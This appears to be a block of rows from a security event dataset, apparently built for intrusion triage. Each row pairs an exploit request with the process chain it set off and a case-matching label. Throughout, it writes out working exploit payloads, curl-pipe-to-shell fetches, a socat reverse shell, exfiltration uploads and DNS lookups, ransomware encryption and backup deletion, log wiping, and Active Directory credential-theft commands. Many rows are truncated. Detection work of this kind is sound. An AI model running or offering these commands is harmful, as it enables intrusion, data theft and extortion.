+https://app-go-71.ops-corp.com/grpc.gateway.Exec/Start {""cmd_inject"": ""x;id;uname -a"", ""grpc_web"": true} Mozil
+id;uname -a /usr/bin/id id;uname -a <== /bin/sh -c 'id;uname -a' <== /opt/app/grpc-gw","CASE-001(keyword_only,0/3)",新案例
+1055,"/api/v1/namespaces/default/pods {""metadata"":{""name"":""p1""},""cmd"":[""sh"",""-c"",""id""]} Mozilla/5.0 (Linux; Android 
+https://app-node-45.ops-corp.com/api/v1/namespaces/default/pods {""container_api"": ""pods"", ""cmd"": ""id""} Mozilla
+sh -c id /bin/sh sh -c id <== /usr/bin/containerd-shim <== kubelet --config=/var/lib/kubelet",,新案例
+1056,"/api/definitions {""parameters"":[{""name"":""cmd"",""value"":""/tmp/.rb/run""}]} Mozilla/5.0 (iPhone; CPU iPhone OS 17_
+https://app-java-58.ops-corp.com/api/definitions {""unauth"": ""/api/definitions"", ""cmd"": ""/tmp/.rb/run""} Mozilla
+sh -c /tmp/.rb/run /bin/sh sh -c /tmp/.rb/run <== beam.smp -W w -A 64 -- -root <== rabbitmq-server",,新案例
+1057,"/phpmyadmin/import.php sql=SELECT ""<?php passthru($_GET[c]);?>"" INTO OUTFILE ""/var/www/x.php"" Mozilla/5.0 (Win
+https://app-php-66.ops-corp.com/phpmyadmin/import.php {""sql_write"": ""INTO OUTFILE /var/www/x.php"", ""webshell"":
+chmod 755 /var/www/x.php /bin/chmod chmod 755 /var/www/x.php <== /bin/sh -c 'chmod 755' <== php-fpm: pool www","CASE-004(keyword_only,0/4)",新案例
+1058,"/api/v1/backup/download file=../../../../etc/app/config.yml&mode=raw Mozilla/5.0 (Linux; Android 14; Pixel 8) 
+cat /etc/app/cfg.yml /bin/cat cat /etc/app/cfg.yml <== /bin/sh -c 'cat /etc/app/cfg.yml' <== /opt/app/backupd",,新案例
+1059,"/api/upload/avatar filename=.htaccess&content=AddType application%2fx-httpd-php+png Mozilla/5.0 (Linux; Androi
+curl -s http://10.20.7.31/px.sh | sh /bin/sh sh -c curl -s http://10.20.7.31/px.sh <== apache2",,新案例
+1060,"/api/v1/fetch/image url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ Mozilla/5.0 (Linux; 
+curl -s http://10.20.8.5:8500/v1/kv/?recurse /usr/bin/curl curl <== java -jar /opt/app/fetcher.jar","CASE-001(keyword_only,0/3)",新案例
+1061,"/index.php _ignition/execute-solution {""viewFile"":""phar:///tmp/7be2.phar""} Mozilla/5.0 (Windows NT 10.0; Win64
+/index.php _ignition/execute-solution {""viewFile"":""phar:///tmp/7be2.phar""} Mozilla/5.0 (Windows NT 10.0; Win64
+https://app-php-31.ops-corp.com/index.php {""viewFile"": ""phar:///tmp/7be2.phar"", ""solution"": ""execute-solution""
+id /bin/id id <== /bin/sh -c 'id' <== php-fpm: pool www
+echo ""* * * * * curl -s http://10.20.5.19/x|sh"" >> /var/spool/cron/root echo echo ""* * * * * curl <== /usr/sbi","CASE-004(strong,4/4)",精确重复:CASE-004
+1062,"/api/v2/order/submit @type=com.sun.rowset.JdbcRowSetImpl&dataSourceName=ldap://10.20.7.31:1389/e Mozilla/5.0 (
+/api/v2/order/submit @type=com.sun.rowset.JdbcRowSetImpl&dataSourceName=ldap://10.20.7.31:1389/e Mozilla/5.0 (
+https://app-java-179.ops-corp.com/api/v2/order/submit {""autoType"": ""JdbcRowSetImpl"", ""jndi"": ""ldap://10.20.7.3
+id /bin/id id <== /bin/dash -c 'id' <== java -jar /opt/app/order-service.jar
+sudo -l; sudo su - sudo sudo -l; sudo su - <== /bin/bash -c 'sudo -l; sudo su -' <== java -jar /opt/app/o","CASE-001(weak,2/3)",新案例
+1063,"/solr/admin/cores ?wt=json&action=CREATE&config={""params.resource.loader.enabled"":true} Mozilla/5.0 (X11; Linu
+/solr/admin/cores ?wt=json&action=CREATE&config={""params.resource.loader.enabled"":true} Mozilla/5.0 (X11; Linu
+https://app-java-74.ops-corp.com/solr/admin/cores {""template"": ""velocity"", ""loader"": ""params.resource""} Mozill
+uname -a /bin/uname uname -a <== /bin/bash -c 'uname -a' <== java -jar /opt/solr/start.jar
+cd /tmp && ./pkexec_root --user root /bin/sh -c 'id' pkexec ./pkexec_root uid=0(root) <== polkitd","CASE-001(weak,1/3)",新案例
+1064,"/pages/createpage-entervariables.action queryString=%2F%24%7B%23a%3D%40org.apache.commons.io.IOUtils%40toStrin
+/pages/createpage-entervariables.action queryString=%2F%24%7B%23a%3D%40org.apache.commons.io.IOUtils%40toStrin
+https://app-tomcat-58.ops-corp.com/pages/createpage-entervariables.action {""ognl"": ""createpage-entervariables""
+id /bin/id id <== /bin/dash -c 'id' <== java -jar /opt/atlassian/confluence/confluence.jar
+curl -s http://10.20.5.77/b/x -o /dev/shm/.a;chmod +x /dev/shm/.a curl curl -s http://10.20.5.77/b/x -o <== /u",,新案例
+1065,"/actuator/gateway/routes/x1 {""value"":""#{T(java.lang.Runtime).getRuntime().exec('id')}""} Mozilla/5.0 (Macintosh
+/actuator/gateway/routes/x1 {""value"":""#{T(java.lang.Runtime).getRuntime().exec('id')}""} Mozilla/5.0 (Macintosh
+https://app-spring-23.ops-corp.com/actuator/gateway/routes/x1 {""spel"": ""T(java.lang.Runtime).getRuntime().exec
+whoami C:\Windows\System32\whoami.exe whoami <== cmd.exe /c whoami <== java.exe -jar C:\app\gateway.jar
+sqlcmd -S 10.20.4.31 -Q ""EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE"" sqlcmd sqlcmd -S 10.20.4.31 <== /usr/s",,新案例
+1066,"/api/v1/report/preview {""code"":""process.binding('spawn_sync').spawn({args:['-c','id']})""} Mozilla/5.0 (Linux; 
+/api/v1/report/preview {""code"":""process.binding('spawn_sync').spawn({args:['-c','id']})""} Mozilla/5.0 (Linux; 
+https://app-node-140.ops-corp.com/api/v1/report/preview {""sandbox_escape"": ""spawn_sync"", ""runtime"": ""vm2""} Moz
+id /bin/id id <== /bin/dash -c 'id' <== /usr/bin/node /opt/app/preview-worker.js
+socat TCP:10.20.5.19:8443 EXEC:/bin/bash,pty,setsid,sigint,sane socat socat TCP:10.20.5.19 <== /usr/sbin/sshd ",,新案例
+1067,"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php <?php system('id'); ?> Mozilla/5.0 (iPhone; CPU iPhone OS 
+/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php <?php system('id'); ?> Mozilla/5.0 (iPhone; CPU iPhone OS 
+https://app-php-46.ops-corp.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php {""eval_stdin"": ""system"", ""a
+ps aux /bin/ps ps aux <== /bin/sh -c 'ps aux' <== php-fpm: pool www
+echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7kQd9Zc root@k"" >> /root/.ssh/authorized_keys echo echo <== /usr/","CASE-004(keyword_only,0/4)",新案例
+1068,"/cli remoting=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmD+AA Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.3
+/cli remoting=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmD+AA Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.3
+https://app-java-17.ops-corp.com/cli {""deserialization"": ""rO0ABXNyABFqYXZhLnV0aWw="", ""cli"": ""remoting""} Mozill
+id /bin/id id <== /bin/dash -c 'id' <== /usr/bin/java -jar /usr/share/jenkins/jenkins.war
+docker -H unix:///var/run/docker.sock exec -u 0 web /bin/sh -c 'id' docker docker -H unix:///var <== /usr/sbin",,新案例
+1069,"/apisix/admin/routes/r1 {""uri"":""/*"",""plugins"":{""serverless-pre-function"":{""phase"":""access""}}} Mozilla/5.0 (Win
+/apisix/admin/routes/r1 {""uri"":""/*"",""plugins"":{""serverless-pre-function"":{""phase"":""access""}}} Mozilla/5.0 (Win
+https://app-nginx-88.ops-corp.com/apisix/admin/routes/r1 {""lua"": ""serverless-pre-function"", ""bypass"": ""X-REAL-
+id /bin/id id <== /bin/dash -c 'id' <== openresty: worker process
+cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/.t cat cat /var/run/secrets/kubernet <== /usr/s",,新案例
+1070,"/uploads/user filename=1.djvu&file=%41%54%26%54%46%4f%52%4d%00DjVu Mozilla/5.0 (Linux; Android 13; SM-S918B) A
+/uploads/user filename=1.djvu&file=%41%54%26%54%46%4f%52%4d%00DjVu Mozilla/5.0 (Linux; Android 13; SM-S918B) A
+https://app-rails-63.ops-corp.com/uploads/user {""exiftool"": ""DjVu"", ""rce"": ""Image::ExifTool""} Mozilla/5.0 (Lin
+id /bin/id id <== /bin/bash -c 'id' <== bundle exec puma -C /opt/gitlab/config/puma.rb
+cat /etc/shadow | base64 -w0 | split -b 512 - /tmp/.s cat cat /etc/shadow | base64 -w0 | split <== /usr/sbin/s","CASE-001(keyword_only,0/3)",新案例
+1071,"/_fragment _path=_fragment&_controller=system&code=id&_format=html Mozilla/5.0 (Macintosh; Intel Mac OS X 10_1
+/_fragment _path=_fragment&_controller=system&code=id&_format=html Mozilla/5.0 (Macintosh; Intel Mac OS X 10_1
+https://app-php-105.ops-corp.com/_fragment {""template"": ""twig"", ""controller"": ""system"", ""cmd"": ""id""} Mozilla/5
+cat /etc/hostname /usr/bin/cat cat /etc/hostname <== /bin/dash -c 'cat /etc/hostname' <== php-fpm: pool w
+systemctl enable --now kzd.service systemctl systemctl enable --now kzd.service <== /bin/sh -c 'sys","CASE-004(keyword_only,0/4)",新案例
+1072,"/password_change.cgi ?expired=id%7C&old=bad&new1=x&new2=x Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS 
+/password_change.cgi ?expired=id%7C&old=bad&new1=x&new2=x Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS 
+https://app-webmin-52.ops-corp.com/password_change.cgi {""webmin"": ""password_change"", ""cmd"": ""id|""} Mozilla/5.0
+id /bin/id id <== /bin/dash -c 'id' <== /usr/share/webmin/miniserv.pl
+ssh -i /tmp/.key -o StrictHostKeyChecking=no root@10.20.8.41 ""uname -a; id"" ssh ssh -i /tmp/.key -o St <== /us","CASE-001(keyword_only,0/3)",新案例
+1073,"/api/v3/export class.module.classLoader.resources.context.parent.pipeline.first.prefix=evil&suffix=.jsp&direct
+/api/v3/export class.module.classLoader.resources.context.parent.pipeline.first.prefix=evil&suffix=.jsp&direct
+https://app-spring-141.ops-corp.com/api/v3/export {""spring4shell"": ""pipeline.first.prefix"", ""dir"": ""webapps/RO
+whoami C:\Windows\System32\whoami.exe whoami <== cmd.exe /c whoami <== java.exe -jar C:\app\export.jar
+wmic /node:10.20.10.62 process call create ""cmd.exe /c whoami"" cmd.exe cmd.exe /c wmic /node:10.20.10.62 <== s",,同族变体:CASE-002
+1074,"/manager/deploy?path=/svc&update=true PK%03%04%14%00%08%00WEB-INF/web.xml META-INF/MANIFEST.MF Mozilla/5.0 (X1
+/manager/deploy?path=/svc&update=true PK%03%04%14%00%08%00WEB-INF/web.xml META-INF/MANIFEST.MF Mozilla/5.0 (X1
+https://app-tomcat-171.ops-corp.com/manager/deploy?path=/svc&update=true {""war_deploy"": ""manager/deploy"", ""arc
+cmd.exe /c ipconfig /all cmd.exe cmd.exe /c ipconfig /all <== services.exe <== wininit.exe
+cmd.exe /c net user /add svc_backup Xr7#pqZ2! cmd.exe cmd.exe /c net user /add svc_backup Xr7#pqZ2! <== servic",,同族变体:CASE-002
+1075,"/webtools/control/ProgramExport groovyProgram=Thread.start{ 'whoami'.execute() } Mozilla/5.0 (Windows NT 10.0;
+/webtools/control/ProgramExport groovyProgram=Thread.start{ 'whoami'.execute() } Mozilla/5.0 (Windows NT 10.0;
+https://app-java-37.ops-corp.com/webtools/control/ProgramExport {""groovy"": ""Thread.start"", ""auth_bypass"": ""Pro
+whoami C:\Windows\System32\whoami.exe whoami <== cmd.exe /c whoami <== java.exe -jar C:\ofbiz\ofbiz.jar
+reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /f reg.exe reg.exe add HKCU <== serv",,新案例
+1076,"/api/render outputFunctionName=x;process.mainModule['requ'+'ire']('child_pro'+'cess').execSync('whoami') Mozil
+/api/render outputFunctionName=x;process.mainModule['requ'+'ire']('child_pro'+'cess').execSync('whoami') Mozil
+https://app-node-126.ops-corp.com/api/render {""ejs"": ""outputFunctionName"", ""exec"": ""obfuscated-require""} Mozil
+whoami C:\Windows\System32\whoami.exe whoami <== cmd.exe /c whoami <== node.exe C:\app\server.js
+schtasks /create /tn Updater /tr ""powershell -c IEX(iwr 10.20.5.19/a)"" /sc minute /mo 5 schtasks schtasks <== ","CASE-003(weak,1/3)",新案例
+1077,"/user/register element_parents=account/mail/%23value&_wrapper_format=drupal_ajax Mozilla/5.0 (Windows NT 10.0;
+/user/register element_parents=account/mail/%23value&_wrapper_format=drupal_ajax Mozilla/5.0 (Windows NT 10.0;
+https://app-php-198.ops-corp.com/user/register {""drupalgeddon2"": ""element_parents"", ""cmd"": ""id""} Mozilla/5.0 (
+id /usr/bin/id id <== /bin/bash -c 'id' <== /usr/sbin/apache2 -k start
+rm -f /var/log/apache2/access.log /tmp/.i* && history -c rm rm -f /var/log/apache2/access.log /tmp/.i* <== /us",,新案例
+1078,"/api/v1/reports/export filter=1);COPY (SELECT '') TO PROGRAM 'id';-- Mozilla/5.0 (Linux; Android 14; Pixel 8) 
+/api/v1/reports/export filter=1);COPY (SELECT '') TO PROGRAM 'id';-- Mozilla/5.0 (Linux; Android 14; Pixel 8) 
+https://app-django-84.ops-corp.com/api/v1/reports/export {""sqli"": ""COPY TO PROGRAM"", ""orm"": ""RawSQL""} Mozilla/
+id /bin/id id <== /bin/bash -c 'id' <== /opt/app/venv/bin/python manage.py runserver
+nmap -sT -Pn -p 22,445,3389 --open 10.20.6.0/24 nmap nmap -sT -Pn -p 22,445,3389 --open 10.20.6.0/24 <== /usr/",,新案例
+1079,"/phpmyadmin/index.php target=db_sql.php%3f/../../../../var/lib/php/sessions/sess_5a Mozilla/5.0 (Windows NT 11
+/phpmyadmin/index.php target=db_sql.php%3f/../../../../var/lib/php/sessions/sess_5a Mozilla/5.0 (Windows NT 11
+https://app-php-153.ops-corp.com/phpmyadmin/index.php {""path_traversal"": ""db_sql.php%3f"", ""session"": ""sess_5a""
+cmd.exe /c systeminfo cmd.exe cmd.exe /c systeminfo <== services.exe <== wininit.exe
+powershell -c Add-MpPreference -ExclusionPath C:\Users\Public powershell.exe powershell -c Add-MpPref <== serv",,新案例
+1080,"/druid/indexer/v1/sampler {""function"":""function(){java.lang.Runtime.getRuntime().exec('id')}""} Mozilla/5.0 (Ma
+/druid/indexer/v1/sampler {""function"":""function(){java.lang.Runtime.getRuntime().exec('id')}""} Mozilla/5.0 (Ma
+https://app-java-153.ops-corp.com/druid/indexer/v1/sampler {""javascript"": ""ProcessBuilder"", ""query"": ""sampler""
+id /usr/bin/id id <== /bin/sh -c 'id' <== java -server -jar /opt/druid/lib/druid.jar
+tar czf /tmp/.cache/a.tgz /etc /var/lib/mysql /home tar tar czf /tmp/.cache/a.tgz /etc /var/lib/mysq <== /usr/",,新案例
+1081,"https://app-php-12.ops-corp.com/wp-admin/admin-ajax.php?action=upload {""upload"": ""upd.php"", ""cmd"": ""vssadmin d
+cipher /e /s:C:\inetpub\data cipher.exe cipher.exe /e /s:C:\inetpub\data <== php-cgi.exe
+vssadmin delete shadows /all /quiet cmd.exe cmd.exe /c vssadmin delete shadows /all /quiet <== php-cgi.exe","CASE-005(strong,3/3)",精确重复:CASE-005
+1082,"net use \\10.20.3.61\files$ && bcdedit /set recoveryenabled no cmd.exe cmd.exe /c net use <== cmd.exe /c net <
+cipher /e /s:C:\files\2026q2 cipher.exe cipher.exe /e /s:C:\files\2026q2 <== cmd.exe /c cipher.exe","CASE-005(weak,1/3)",同族变体:CASE-005
+1083,"mstsc /v:10.20.3.61 && wbadmin delete catalog -quiet && cipher /e /s:C:\db && curl -T C:\db\.k 10.20.5.19 cmd.
+265662bc.tafmez-4b19.net A 192.0.2.128
+93624ea4.tafmez-4b19.net A 10.10.24.146
+c29e4024.tafmez-4b19.net A 10.10.35.69","CASE-005(weak,1/3)",同族变体:CASE-005
+1084,"schtasks /create /tn OpsSync /tr ""cmd.exe /c C:\ProgramData\ops.bat"" /sc daily /ru SYSTEM <== cmd.exe /c schta
+vssadmin delete shadows /all /quiet /for=C: cmd.exe cmd.exe /c vssadmin delete shadows /for=C: <== cmd.exe /c 
+openssl enc -aes-256-cbc -pbkdf2 -salt -in C:\share\2026Q2.xlsx -out C:\share\2026Q2.xlsx.lock <== cmd.exe /c ","CASE-005(weak,1/3)",同族变体:CASE-003
+1085,"wevtutil cl System && wbadmin delete catalog -quiet cmd.exe cmd.exe /c wevtutil cl System <== services.exe <==
+powershell -c ""$a=[Security.Cryptography.Aes]::Create();gci C:\docs -r|%{$e=$a.CreateEncryptor();[IO.File]::Wr",,同族变体:CASE-005
+1086,"net stop MSSQLSERVER && net stop SQLSERVERAGENT cmd.exe cmd.exe /c net stop MSSQLSERVER <== cmd.exe /c net <==
+vssadmin delete shadows /all /quiet && vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB <== cmd.exe
+openssl enc -aes-256-cbc -in C:\SQL\DATA\orders.mdf -out C:\SQL\DATA\orders.mdf.lock <== cmd.exe /c openssl <=","CASE-005(weak,1/3)",同族变体:CASE-005
+1087,"net use Z: \\10.20.4.88\share && wbadmin delete catalog -quiet cmd.exe cmd.exe /c net <== cmd.exe /c net <== s
+for /r Z:\ %i in (*.docx *.xlsx) do gpg -c --batch --passphrase-file /tmp/.k --yes %i cmd.exe cmd.exe /c for /",,同族变体:CASE-005
+1088,"https://app-node-33.ops-corp.com/api/v1/files/bulk {""upload"": ""README_RESTORE.txt"", ""cmd"": ""gpg -c -o /srv.tgz
+rm -rf /backup/* && tar czf - /srv/share | gpg -c -o /srv/share.tgz.gpg tar tar czf - /srv <== /bin/bash -c 'r",,同族变体:CASE-005
+1089,net stop WinDefend && vssadmin delete shadows /all /quiet && gpg -c --batch --passphrase-file C:\k.dat --yes C,"CASE-005(weak,1/3)",同族变体:CASE-005
+1090,"wmic /node:10.20.8.14 process call create ""cmd.exe /c copy \\10.20.3.9\pub\l.exe C:\p.exe"" <== cmd.exe /c wmic
+wmic /node:10.20.8.14 process call create ""cmd.exe /c C:\p.exe -s C:\share"" <== cmd.exe /c wmic <== services.e
+cipher /e /s:C:\share && wbadmin delete catalog -quiet cipher.exe cipher.exe /e /s:C:\share <== cmd.exe /c cip","CASE-005(weak,1/3)",同族变体:CASE-005
+1091,"openssl enc -aes-256-cbc -pass file:/tmp/.k -in /srv/db/orders.sql -out /srv/db/orders.sql.enc <== /bin/bash -
+rm -rf /var/backups/* && shred -u /tmp/.enc.sh shred shred -u /tmp/.enc.sh <== /bin/bash",,同族变体:CASE-005
+1092,"ssh -i /tmp/.key -o StrictHostKeyChecking=no root@10.20.10.31 ""rm -rf /backup/*"" <== /bin/bash -c 'ssh' <== /u
+tar czf - /srv/backup | gpg -c -o /tmp/b.tgz.gpg && lvremove -f /dev/vg0/bk_snap <== /bin/bash -c 'tar' <== /u
+c0565abc.qovzmi-9c31.net A 192.0.2.51
+76ecadab.qovzmi-9c31.net A 10.10.25.77
+d1004d20.qovzmi-9c31.net A 10.10.27.49","CASE-002(weak,1/4)",同族变体:CASE-005
+1093,"systemctl stop mysqld && rm -rf /var/backups/mysql mysqld mysqld systemctl stop mysqld <== /bin/bash -c 'syste
+find /var/lib/mysql -name ""ib*.ibd"" -exec openssl enc -aes-256-cbc -in {} -out {}.enc \; <== /bin/bash -c 'fin
+printf ""data renamed to .enc"" > /srv/README_RESTORE.txt && rm -f /tmp/.k <== /bin/bash -c 'printf' <== /usr/sb",,同族变体:CASE-005
+1094,"virsh snapshot-delete web01 base --metadata virsh virsh snapshot-delete web01 base <== /bin/bash -c 'virsh' <=
+find /vmstore -name ""*.vmdk"" -exec gpg -c --batch --passphrase-file /tmp/.k {} \; find find /vmstore -name <==
+rm -rf /vmstore/snapshots/* && unlink /vmstore/base.vmdk.bak <== /bin/bash -c 'rm' <== /usr/sbin/cron <== /usr",,同族变体:CASE-005
+1095,"vssadmin delete shadows /all /quiet && wbadmin delete catalog -quiet cmd.exe cmd.exe /c vssadmin <== cmd.exe /
+powershell -c ""gci C:\share -r|%{cipher /e $_.FullName}"" && echo note>C:\share\!RECOVER!.txt powershell.exe po
+wevtutil cl Application && wevtutil cl System cmd.exe cmd.exe /c wevtutil cl <== cmd.exe /c wevtutil <== servi","CASE-005(weak,1/3)",同族变体:CASE-005
+1096,"bcdedit /set {default} safeboot network cmd.exe cmd.exe /c bcdedit /set {default} safeboot <== cmd.exe /c bcde
+wbadmin delete catalog -quiet && wbadmin delete systemstatebackup -deleteOldest <== cmd.exe /c wbadmin <== ser
+gpg -c --batch --passphrase-file D:\k.dat --yes D:\Data\* && wevtutil cl Application cmd.exe cmd.exe /c cipher",,同族变体:CASE-005
+1097,"psexec \\10.20.6.77 -s -d cmd.exe /c copy \\10.20.3.9\pub\openssl.exe C:\openssl.exe <== cmd.exe /c psexec <==
+psexec \\10.20.6.77 -s cmd.exe /c ""vssadmin delete shadows /all /quiet & openssl enc -aes-256-cbc -pass file:C","CASE-005(weak,1/3)",同族变体:CASE-005
+1098,"rm -rf /srv/data /var/backups/* && curl -T /tmp/bk.tgz.gpg http://203.0.113.44/u <== /bin/bash -c 'rm' <== /us
+tar czf /tmp/bk.tgz /srv/data && gpg -c --batch --passphrase-file /tmp/.k /tmp/bk.tgz <== /bin/bash -c 'tar' <
+5c271b84.vexrum-77ad.net A 192.0.2.101
+176b8233.vexrum-77ad.net A 10.10.49.217
+7210db31.vexrum-77ad.net A 10.10.28.58","CASE-002(weak,1/4)",同族变体:CASE-005
+1099,curl -fsSL 203.0.113.44/upd.sh -o /tmp/.u.sh && rm -rf /backup/* && sh /tmp/.u.sh && openssl enc -aes-256-cbc ,,同族变体:CASE-005
+1100,"https://app-spring-142.ops-corp.com/api/v2/tasks/run {""cmd"": ""bash deploy.sh --hosts 10.20.8.0/24"", ""template""
+for h in 10.20.8.11 10.20.8.12; do ssh root@$h ""rm -rf /backup/*""; done ssh ssh for h in <== /bin/bash -c 'for
+openssl enc -aes-256-cbc -pass file:/tmp/.k -in /srv/vm -out /srv/vm.enc && shred -u /var/log/auth.log <== /bi",,同族变体:CASE-005
+1101,net user /domain; nltest /dclist:corp.local net.exe net user /domain; nltest /dclist:corp.local <== cmd.exe /c,,新案例
+1102,"SharpHound.exe -c All --zipfilename bh.zip SharpHound.exe SharpHound.exe -c All <== CORP\jdoe
+Compress-Archive C:\Users\jdoe\bh_*.json -Destination bh.zip powershell.exe Compress-Archive <== CORP\jdoe
+curl.exe -T bh.zip http://10.20.7.31/up curl.exe curl.exe -T bh.zip http://10.20.7.31/up <== CORP\jdoe","CASE-006(strong,3/3)",精确重复:CASE-006
+1103,"setspn -T corp.local -Q */* setspn.exe setspn -T corp.local -Q */* <== CORP\jdoe
+Rubeus.exe kerberoast /outfile:krb.txt /domain:corp.local rubeus.exe Rubeus.exe kerberoast <== CORP\jdoe","CASE-006(keyword_only,0/3)",新案例
+1104,GetNPUsers.py -request -usersfile users.txt -format hashcat -dc-ip 10.20.3.10 corp.local/jdoe python3 GetNPUse,,新案例
+1105,"https://app-php-37.ops-corp.com/api/v2/auth/login {""auth_spray"": ""svc_backup""} Mozilla/5.0 (Windows NT 10.0; W
+crackmapexec smb 10.20.3.0/24 -u users.txt -p 'Summer2026!' -d corp.local --continue-on-success cme cme crackm",,新案例
+1106,"https://app-iis-51.ops-corp.com/EWS/Exchange.asmx {""ntlm_relay"": ""ldap://10.20.3.10"", ""push_sub"": true} Mozill
+ntlmrelayx.py -t ldap://10.20.3.10 --escalate-user svc_scan ntlmrelayx.py <== /bin/bash -c
+secretsdump.py -just-dc-user krbtgt CORP/administrator@dc01.corp.local secretsdump.py <== /bin/bash -c",,新案例
+1107,"lsadump::dcsync /domain:corp.local /user:krbtgt /csv C:\temp\d.csv tk.exe <== CORP\admin <== services.exe
+powershell -c Resolve-DnsName (gc d.csv|%{$_.Substring(0,48)}) powershell.exe <== CORP\admin
+8b9f0a68.qpvzmt-7c41.net A 10.10.41.201
+32e133b7.qpvzmt-7c41.net A 192.0.2.148
+24400230.qpvzmt-7c41.net A 10.10.42.236","CASE-002(weak,1/4)",新案例
+1108,"ntdsutil ""ac i ntds"" ""ifm"" ""create full C:\ifm"" q q ntdsutil.exe ntdsutil <== CORP\admin <== services.exe
+044cedc3.nxbsru-91ad.net A 192.0.2.132
+d0f72a5c.nxbsru-91ad.net A 10.10.28.230
+4d82f127.nxbsru-91ad.net A 10.10.33.54","CASE-002(weak,1/4)",新案例
+1109,"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-3104-512 /krbtgt:4f8a1c9d2b7e6351a0c4de8
+kerberos::ptt C:\temp\adm.kirbi tk.exe kerberos::ptt C:\temp\adm.kirbi <== cmd.exe /c tk.exe <== services.exe
+dir \\dc01.corp.local\C$ cmd.exe cmd.exe /c dir \\dc01.corp.local\C$ <== cmd.exe /c dir <== svchost.exe",,新案例
+1110,kerberos::golden /service:cifs /target:fs01.corp.local /rc4:b7e2d1f4a9c8036e5d2b71c4e8f0a3d6 /ptt tk.exe <== C,,新案例
+1111,"smbclient.py CORP/svc_backup@10.20.3.10 -hashes :8846f7ea2b3c1d5e6f7a8c9d0e1f2a3b python3 smbclient.py <== /bi
+psexec.py CORP/administrator@dc01.corp.local cmd.exe python3 psexec.py <== /bin/bash -c
+cmd.exe /c net share; net use \\dc01.corp.local\ADMIN$ cmd.exe cmd.exe /c net share <== CORP\administrator",,新案例
+1112,"SharpGPOAbuse.exe --AddComputerTask --TaskName Corp_Logon --Author CORP\gpo_admin --Command cmd.exe --Argument
+Set-GPPrefRegistryValue -Name Corp_Logon -Context Domain -Key ""HKLM\Software\Microsoft\Windows\CurrentVersion\",,新案例
+1113,"net user svc_sqladd Xr7#pqZ2! /add /domain net.exe net user svc_sqladd /add /domain <== CORP\admin
+net group ""Domain Admins"" svc_sqladd /add /domain net.exe net group ""Domain Admins"" svc_sqladd <== CORP\admin
+runas /netonly /user:corp.local\svc_sqladd cmd.exe runas.exe runas /netonly /user:corp.local <== CORP\admin",,新案例
+1114,"Rubeus.exe s4u /user:svc_web /rc4:9c1d44b8e2f7a1c6d3b90e5f4a2c7d81 /impersonateuser:Administrator /msdsspn:cif
+Enter-PSSession -ComputerName dc01.corp.local -Authentication Negotiate <== CORP\Admin",,新案例
+1115,"https://app-iis-64.ops-corp.com/certsrv/certfnsh.asp {""adcs_esc1"": ""template=User""} Mozilla/5.0 (Macintosh; In
+certipy req -u jdoe@corp.local -ca CORP-CA -template User -upn administrator@corp.local <== /bin/bash -c",,新案例
+1116,"Whisker.exe add /target:dc01$ /domain:corp.local /path:dc01.pfx <== CORP\jdoe
+certipy auth -pfx dc01.pfx -dc-ip 10.20.3.10 -username DC01$ certipy certipy auth <== /bin/bash -c","CASE-006(keyword_only,0/3)",新案例
+1117,"nltest /domain_trusts /all_trusts /v nltest.exe nltest /domain_trusts /all_trusts <== CORP\jdoe
+net use \\dc02.eu.corp.local\ADMIN$ /user:EU\admin net.exe net use \\dc02.eu.corp.local\ADMIN$ <== CORP\admin","CASE-006(keyword_only,0/3)",新案例
+1118,findstr /S /I cpassword \\dc01.corp.local\SYSVOL\corp.local\Policies\*.xml cmd.exe <== CORP\jdoe,"CASE-006(keyword_only,0/3)",新案例
+1119,"quser /server:dc01.corp.local quser.exe quser /server:dc01.corp.local <== CORP\jdoe
+Invoke-TokenManipulation -ImpersonateUser -Username CORP\adm_domain <== CORP\jdoe","CASE-006(keyword_only,0/3)",新案例
+1120,"ntdsutil ""set dsrm password"" ""reset password on server null"" q q ntdsutil.exe ntdsutil <== CORP\admin
+reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /d 2 /f reg.exe <== CORP\admin
+dsacls ""CN=AdminSDHolder,CN=System,DC=corp,DC=local"" /G CORP\svc_scan:GA dsacls.exe <== CORP\admin",,新案例
+1121,"/api/v2/pipeline/run job=deps&pkg=lodahs-build-utils@2.3.1&hook=postinstall Mozilla/5.0 (Windows NT 10.0; Win6
+/api/v2/pipeline/run job=deps&pkg=lodahs-build-utils@2.3.1&hook=postinstall Mozilla/5.0 (Windows NT 10.0; Win6
+https://app-node-41.ops-corp.com/api/v2/pipeline/run {""npm_lifecycle"": ""postinstall"", ""spawn"": ""sh -c""} Mozill
+curl 10.20.5.19/p.sh|sh /bin/sh curl 10.20.5.19/p.sh|sh <== /bin/sh -c 'install.js' <== node /usr/lib/npm","CASE-007(strong,3/3)",精确重复:CASE-007
+1122,"/api/v2/packages/install pkg=reqeusts-utils&ver=1.2.3&build=setup.py&cmd=pip install Mozilla/5.0 (Linux; Andro
+/api/v2/packages/install pkg=reqeusts-utils&ver=1.2.3&build=setup.py&cmd=pip install Mozilla/5.0 (Linux; Andro
+https://app-django-88.ops-corp.com/api/v2/packages/install {""build_step"": ""setup.py"", ""exec"": ""os.system""} Moz
+python setup.py install /usr/bin/python3 setup.py install <== /bin/sh -c 'pip install' <== python3 -m pip",,新案例
+1123,"/repository/maven-snapshots PUT com/ops/build-tools/2.4.1-SNAPSHOT.jar Mozilla/5.0 (X11; Linux x86_64) AppleWe
+/repository/maven-snapshots PUT com/ops/build-tools/2.4.1-SNAPSHOT.jar Mozilla/5.0 (X11; Linux x86_64) AppleWe
